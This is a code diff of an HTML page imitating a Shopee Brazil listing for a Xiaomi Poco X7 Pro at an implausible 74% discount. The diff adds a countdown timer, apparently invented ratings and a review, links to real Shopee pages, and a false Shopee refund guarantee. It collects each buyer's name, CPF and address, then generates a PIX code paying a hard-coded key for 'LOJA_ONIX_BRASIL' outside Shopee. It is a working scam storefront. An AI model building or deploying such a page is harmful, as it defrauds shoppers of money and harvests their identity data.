@@ -10,59 +10,65 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body { background: var(--bg); font-family: -apple-system, HelveticaNeue, sans-serif; overflow-x: hidden; width: 100%; }
 
-        /* HEADER */
         .top-nav { background: white; padding: 10px; display: flex; align-items: center; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid #eee; height: 50px; }
         .search-container { flex: 1; margin: 0 12px; position: relative; }
         .search-bar { width: 100%; border: none; background: #f0f0f0; padding: 8px 8px 8px 35px; border-radius: 2px; font-size: 14px; outline: none; }
 
-        .main-slider img { width: 100vw; display: block; }
+        .main-slider { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; scrollbar-width: none; background: white; position: relative; }
+        .main-slider img { width: 100vw; scroll-snap-align: start; flex-shrink: 0; object-fit: contain; }
 
         .flash-sale-banner { background: linear-gradient(90deg, #ff4d2d, #ff8a00); color: white; padding: 8px 15px; display: flex; align-items: center; justify-content: space-between; }
         .flash-sale-left { display: flex; align-items: center; gap: 8px; font-weight: bold; font-style: italic; font-size: 16px; }
+        .timer-box { display: flex; align-items: center; gap: 4px; font-style: normal; }
         .timer-unit { background: #000; color: #fff; padding: 2px 4px; border-radius: 2px; font-size: 12px; font-weight: bold; min-width: 22px; text-align: center; }
 
-        .product-card { background: white; padding: 15px; margin-bottom: 8px; }
-        .price-row { color: var(--shopee); font-size: 24px; font-weight: 500; display: flex; align-items: baseline; gap: 5px; }
-        .discount-tag { background: rgba(238, 77, 45, 0.1); color: #ee4d2d; font-size: 11px; font-weight: bold; padding: 2px 4px; border-radius: 2px; margin-left: 8px; }
+        .free-shipping-banner { background: var(--shopee-blue); color: white; padding: 8px 15px; display: flex; align-items: center; font-size: 14px; font-weight: bold; }
+        .free-shipping-banner img { height: 18px; margin-right: 8px; }
 
-        /* ESPECIFICAÇÕES (IGUAL AO TEMPLATE) */
+        .product-card { background: white; padding: 15px; margin-bottom: 8px; position: relative; }
+        .price-row { color: var(--shopee); font-size: 24px; font-weight: 500; display: flex; align-items: baseline; gap: 5px; }
+        .old-price { color: #999; text-decoration: line-through; font-size: 14px; margin-bottom: 5px; }
+        .discount-tag { background: rgba(238, 77, 45, 0.1); color: #ee4d2d; font-size: 11px; font-weight: bold; padding: 2px 4px; border-radius: 2px; margin-left: 8px; text-transform: uppercase; }
+
+        .product-title { font-size: 15px; color: #222; line-height: 1.4; font-weight: 400; }
+        .indicator-tag { background: #ee4d2d; color: white; font-size: 10px; padding: 1px 4px; border-radius: 2px; margin-right: 4px; display: inline-block; vertical-align: middle; }
+
         .section-box { background: white; padding: 15px; margin-bottom: 8px; }
         .section-title { font-size: 14px; font-weight: 500; color: #222; margin-bottom: 12px; text-transform: uppercase; }
         .spec-row { display: flex; padding: 8px 0; border-bottom: 1px solid #f2f2f2; font-size: 13px; }
         .spec-label { width: 120px; color: #757575; }
         .spec-value { flex: 1; color: #222; }
 
-        /* LOJA */
-        .shop-section { background: white; padding: 15px; margin-bottom: 8px; display: flex; align-items: center; justify-content: space-between; }
-        .shop-info { display: flex; align-items: center; gap: 10px; position: relative; }
-        .shop-avatar { width: 45px; height: 45px; border-radius: 50%; border: 1px solid #eee; }
-        .shop-btn { border: 1px solid var(--shopee); color: var(--shopee); padding: 4px 12px; font-size: 12px; border-radius: 2px; text-decoration: none; }
+        .product-ratings-header__wrapper { background: white; padding: 15px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
+        .product-ratings-header__stats-avg { color: var(--shopee); font-weight: bold; font-size: 12px; }
+        .product-ratings-header__see-all { color: var(--shopee); font-size: 13px; text-decoration: none; display: flex; align-items: center; gap: 4px; }
 
-        /* FOOTER COM CHAT E CARRINHO */
+        .review-item { background: white; padding: 15px; border-bottom: 1px solid #f2f2f2; }
+        .user-info { display: flex; align-items: center; gap: 8px; font-size: 13px; font-weight: 500; }
+
         .footer { position: fixed; bottom: 0; width: 100%; height: 50px; background: white; display: flex; border-top: 1px solid #ddd; z-index: 1000; }
-        .footer-icon-btn { width: 60px; display: flex; flex-direction: column; align-items: center; justify-content: center; color: var(--shopee); border-right: 1px solid #eee; }
-        .footer-icon-btn span { font-size: 9px; margin-top: 2px; }
         .btn-buy { flex: 1; background: var(--shopee); color: white; border: none; font-weight: bold; font-size: 15px; cursor: pointer; }
 
-        /* MODAL */
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 2000; }
         .modal-content { position: absolute; bottom: 0; width: 100%; background: white; border-radius: 12px 12px 0 0; padding: 15px; max-height: 90vh; overflow-y: auto; }
         .opt-btn { background: #f5f5f5; border: 1px solid #f5f5f5; padding: 8px 12px; border-radius: 4px; font-size: 12px; margin: 4px; cursor: pointer; }
         .opt-btn.selected { border-color: var(--shopee); color: var(--shopee); background: #fff5f1; }
         .input-box { width: 100%; border: 1px solid #ddd; padding: 12px; border-radius: 4px; margin-bottom: 10px; font-size: 14px; outline: none; }
-        
-        /* CEP ROW */
         .cep-row { display: flex; gap: 8px; margin-bottom: 10px; }
         .btn-cep { background: var(--shopee); color: white; border: none; padding: 0 15px; border-radius: 4px; font-size: 12px; cursor: pointer; font-weight: bold; }
-        
-        .btn-voltar { background: #eee; color: #555; border: none; width: 100%; height: 45px; border-radius: 4px; margin-top: 8px; font-weight: bold; cursor: pointer; }
+        .btn-voltar { background: #eee; color: #555; border: none; width: 100%; height: 45px; border-radius: 4px; margin-top: 8px; font-weight: bold; cursor: pointer; font-size: 14px; }
+
+        .garantia-shopee { display: flex; flex-direction: column; align-items: center; margin-bottom: 10px; color: var(--shopee); font-weight: 500; font-size: 12px; line-height: 1.2; text-align: center; }
+        .garantia-shopee i { font-size: 20px; margin-bottom: 4px; }
     </style>
 </head>
 <body>
 
     <div class="top-nav">
-        <i class="fas fa-arrow-left" style="color:var(--shopee); font-size: 18px;"></i>
-        <div class="search-container"><input type="text" class="search-bar" placeholder="Buscar na Shopee"></div>
+        <a href="https://shopee.com.br/"><i class="fas fa-arrow-left" style="color:var(--shopee); font-size: 18px;"></i></a>
+        <div class="search-container" onclick="window.location.href='https://shopee.com.br/'">
+            <input type="text" class="search-bar" placeholder="Buscar na Shopee">
+        </div>
         <i class="fas fa-shopping-cart" style="color:var(--shopee);"></i>
     </div>
 
@@ -73,6 +79,7 @@
     <div class="flash-sale-banner">
         <div class="flash-sale-left"><i class="fas fa-bolt"></i> OFERTA RELÂMPAGO</div>
         <div class="timer-box">
+            <span style="font-size:12px; margin-right:5px;">TERMINA EM</span>
             <div class="timer-unit" id="h">01</div> : <div class="timer-unit" id="m">30</div> : <div class="timer-unit" id="s">00</div>
         </div>
     </div>
@@ -80,49 +87,30 @@
     <div class="product-card">
         <div class="old-price">R$2.299,00</div>
         <div class="price-row">R$599,00 <span class="discount-tag">74% OFF</span></div>
-        <div class="product-title" style="margin-top:10px;">
-            <span style="background:#ee4d2d; color:white; font-size:10px; padding:1px 4px; border-radius:2px; vertical-align: middle;">Indicado</span>
-            Xiaomi Poco X7 PRO 5G Global Version, Dimensity 8400-Ultra
-        </div>
+        <div class="product-title"><span class="indicator-tag">Indicado</span> Xiaomi Poco X7 PRO 5G Global Version</div>
     </div>
 
-    <div class="shop-section">
-        <div class="shop-info">
-            <img src="https://down-br.img.susercontent.com/file/br-11134216-7r98o-m8ktdfse9yq937" class="shop-avatar">
-            <div>
-                <div class="shop-name">Onix Oficial <i class="fas fa-check-circle" style="color:#2d88ff; font-size:12px;"></i></div>
-                <div style="font-size: 11px; color: #757575;">Ativo há 3 minutos | São Paulo</div>
-            </div>
-        </div>
-        <a href="#" class="shop-btn">Ver Loja</a>
+    <div class="product-ratings-header__wrapper">
+        <div class="product-ratings-header__stats-avg">4.9/5 (2mil resenhas)</div>
+        <a class="product-ratings-header__see-all" href="https://shopee.com.br/Xiaomi-Poco-X6-Pro-5G-Global-Version-i.1078992312.23292818042">Ver tudo</a>
     </div>
 
-    <div class="section-box">
-        <div class="section-title">Especificações do Produto</div>
-        <div class="spec-row"><div class="spec-label">Marca</div><div class="spec-value">Xiaomi / POCO</div></div>
-        <div class="spec-row"><div class="spec-label">Processador</div><div class="spec-value">Dimensity 8400-Ultra</div></div>
-        <div class="spec-row"><div class="spec-label">Memória RAM</div><div class="spec-value">12GB</div></div>
-        <div class="spec-row"><div class="spec-label">Armazenamento</div><div class="spec-value">512GB</div></div>
+    <div class="review-item">
+        <div class="user-info">luizadriano871 <span style="color:#999; font-size:10px;">• 2 dias atrás</span></div>
+        <div style="color:#ee4d2d; font-size:10px; margin:4px 0;">⭐⭐⭐⭐⭐</div>
+        <div style="font-size:13px;">Aparelho monstro!</div>
     </div>
 
+    <div style="height: 60px;"></div>
     <div class="footer">
-        <div class="footer-icon-btn"><i class="far fa-comment-dots"></i><span>Chat</span></div>
-        <div class="footer-icon-btn"><i class="fas fa-cart-plus"></i><span>Carrinho</span></div>
-        <button class="btn-buy" onclick="openModal()">Compre Agora</button>
+        <button class="btn-buy" style="width: 100%;" onclick="openModal()">Compre Agora</button>
     </div>
 
     <div id="modal" class="modal">
         <div class="modal-content">
             <div id="selection-screen">
-                <div style="display: flex; gap: 15px; margin-bottom: 20px;">
-                    <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" style="width:80px; height:80px; border-radius:4px;">
-                    <div>
-                        <div style="color:var(--shopee); font-size:20px; font-weight:500;">R$599,00</div>
-                        <div style="font-size:12px; color:#888;">Estoque: 1071</div>
-                    </div>
-                </div>
                 <p style="font-size:14px; margin-bottom:10px;">Escolha a Cor</p>
-                <div id="options-grid">
+                <div class="options-grid">
                     <button class="opt-btn" onclick="selectVar(this)">AMARELO</button>
                     <button class="opt-btn" onclick="selectVar(this)">PRETO</button>
                     <button class="opt-btn" onclick="selectVar(this)">CINZA</button>
@@ -132,11 +120,11 @@
             </div>
 
             <div id="form-screen" style="display:none;">
-                <h4 style="margin-bottom:15px; text-align:center;">Dados para Entrega</h4>
                 <input type="text" id="nome" class="input-box" placeholder="Nome Completo">
+                <input type="tel" id="cpf" class="input-box" placeholder="CPF">
                 <div class="cep-row">
                     <input type="tel" id="cep" class="input-box" style="margin-bottom:0;" placeholder="CEP">
-                    <button class="btn-cep" onclick="buscarCEP()">BUSCAR</button>
+                    <button class="btn-cep" onclick="buscarCEP()">BUSCAR CEP</button>
                 </div>
                 <input type="text" id="rua" class="input-box" placeholder="Rua / Avenida">
                 <div style="display:flex; gap:8px;">
@@ -144,22 +132,24 @@
                     <input type="text" id="bairro" class="input-box" placeholder="Bairro" style="flex:1">
                 </div>
                 <input type="text" id="cidade" class="input-box" placeholder="Cidade / Estado">
-                <button class="btn-buy" style="width:100%; height:45px; border-radius:4px;" onclick="gerarPagamento()">FINALIZAR</button>
-                <button class="btn-voltar" onclick="document.getElementById('form-screen').style.display='none'; document.getElementById('selection-screen').style.display='block';">VOLTAR</button>
+                <button class="btn-buy" style="width:100%; height:45px; border-radius:4px;" onclick="finalizar()">GERAR PIX</button>
             </div>
 
             <div id="pix-screen" style="display:none; text-align:center;">
-                <p style="font-weight:bold; color:var(--teal);">Código PIX Gerado!</p>
-                <div id="qrcode-container" style="margin:15px 0;"></div>
-                <div id="pix-code-display" style="background:#f5f5f5; padding:10px; font-size:10px; word-break:break-all; border:1px dashed #ccc; margin-bottom:15px;"></div>
-                <button class="btn-buy" style="width:100%; height:45px; border-radius:4px;" onclick="copiarPix()">COPIAR CÓDIGO</button>
+                <div class="garantia-shopee">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Se o produto não for entregue,<br>a Shopee devolve seu dinheiro!</span>
+                </div>
+                <p style="font-weight:bold; color:var(--teal); margin-bottom: 5px;">Código PIX Gerado!</p>
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data={PIX_PRONTO}&color=ee4d2d" style="margin:10px 0;">
+                <div style="background:#f5f5f5; padding:10px; font-size:10px; word-break:break-all; margin-bottom:15px; border: 1px dashed #ccc;">{PIX_PRONTO}</div>
+                <button class="btn-buy" style="width:100%; height:40px; border-radius:4px;" onclick="navigator.clipboard.writeText('{PIX_PRONTO}'); alert('Copiado!')">COPIAR CÓDIGO</button>
             </div>
         </div>
     </div>
 
     <script>
         const CHAVE_PIX = "db0cbb53-17be-449c-89c8-9bffd8f6c7b5";
-        let pixPronto = "";
         let selectedVar = null;
 
         function openModal() { document.getElementById('modal').style.display='block'; }
@@ -170,15 +160,15 @@
         }
 
         function goToForm() {
-            if(!selectedVar) return alert("Selecione uma cor");
+            if(!selectedVar) return alert("Selecione uma cor.");
             document.getElementById('selection-screen').style.display='none';
             document.getElementById('form-screen').style.display='block';
         }
 
         async function buscarCEP() {
-            const cep = document.getElementById('cep').value.replace(/\D/g, '');
-            if(cep.length === 8) {
-                const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+            const cepVal = document.getElementById('cep').value.replace(/\D/g, '');
+            if(cepVal.length === 8) {
+                const res = await fetch(`https://viacep.com.br/ws/${cepVal}/json/`);
                 const data = await res.json();
                 if(!data.erro) {
                     document.getElementById('rua').value = data.logradouro;
@@ -188,21 +178,18 @@
             }
         }
 
-        function gerarPagamento() {
-            if(!document.getElementById('nome').value) return alert("Preencha o nome");
-            pixPronto = `00020101021226580014BR.GOV.BCB.PIX0136${CHAVE_PIX}5204000053039865405599.005802BR5915LOJA_ONIX_BRASIL6009SAO_PAULO62070503***6304E67A`;
-            document.getElementById('qrcode-container').innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${pixPronto}&color=ee4d2d">`;
-            document.getElementById('pix-code-display').innerText = pixPronto;
-            document.getElementById('form-screen').style.display='none';
-            document.getElementById('pix-screen').style.display='block';
+        function finalizar() {
+            if(!document.getElementById('nome').value) return alert("Preencha os dados.");
+            // O código abaixo substitui as tags {PIX_PRONTO} pelo BR Code real na tela
+            const pixPronto = `00020101021226580014BR.GOV.BCB.PIX0136${CHAVE_PIX}5204000053039865405599.005802BR5915LOJA_ONIX_BRASIL6009SAO_PAULO62070503***6304E67A`;
+            
+            document.body.innerHTML = document.body.innerHTML.replaceAll('{PIX_PRONTO}', pixPronto);
+            
+            document.getElementById('modal').style.display = 'block';
+            document.getElementById('form-screen').style.display = 'none';
+            document.getElementById('pix-screen').style.display = 'block';
         }
 
-        function copiarPix() {
-            navigator.clipboard.writeText(pixPronto);
-            alert('Copiado!');
-        }
-
-        // Timer
         let totalSeconds = 5400;
         setInterval(() => {
             const h = Math.floor(totalSeconds / 3600);
@@ -215,5 +202,5 @@
         }, 1000);
     </script>
 </body>
-                    </html>
+</html>
     
